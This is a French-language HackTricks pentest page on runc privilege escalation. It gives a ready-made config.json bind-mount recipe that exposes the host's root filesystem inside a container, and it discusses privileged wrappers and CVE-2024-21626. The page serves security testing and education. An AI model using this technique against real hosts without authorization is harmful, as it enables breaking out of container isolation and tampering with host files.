# Escalade de privilèges RunC

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Pour en savoir plus sur **runc**, consultez la page suivante :

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Si `runc` est accessible à un processus exécuté en tant que root sur l’hôte, vous pouvez utiliser un bundle OCI dont la configuration de montage effectue un bind mount récursif du `/` de l’hôte sur `/` à l’intérieur du conteneur, exposant ainsi le système de fichiers de l’hôte dans cet espace de noms de montage.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Le workflow `runc run` documenté s’exécute avec les privilèges root : les propres exemples de runc indiquent « run as root ». Un utilisateur non privilégié a besoin d’une configuration rootless telle que `runc spec --rootless`, et runc indique que les user namespaces doivent être activés pour ce mode.<sup>[[1]](#references)</sup>

## Wrappers privilégiés et versions du runtime

Un wrapper privilégié qui accepte un bundle OCI contrôlé par l’appelant peut exposer des fichiers de l’hôte s’il autorise des bind mounts dangereux. Vérifiez si le wrapper résout les chemins relatifs et les liens symboliques avant de valider les sources et destinations des mounts, et s’il restreint `process.cwd`. Une règle sudo ou un `config.json` accessible en écriture ne prouve pas à lui seul que le wrapper acceptera le bundle ou l’exécutera avec les privilèges de l’hôte.

Par ailleurs, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) a affecté les versions upstream de `runc` de `1.0.0-rc93` à `1.1.11` ; `1.1.12` contient le correctif upstream. Des descripteurs de fichiers leaked et une validation insuffisante du répertoire de travail pouvaient placer un processus de conteneur en dehors de sa racine dans certains workflows `runc run` ou `runc exec`. Les numéros de descripteurs de fichiers dépendent de l’invocation, et une chaîne de version ne permet pas d’établir la possibilité d’exploitation lorsqu’un fournisseur a rétroporté des correctifs ou que l’appelant ne peut pas contrôler une invocation privilégiée du runtime.

## References

- [1] [runc : outil CLI pour créer et exécuter des conteneurs](https://github.com/opencontainers/runc#using-runc)
- [2] [Spécification du runtime OCI : mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Sous-arbres partagés](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
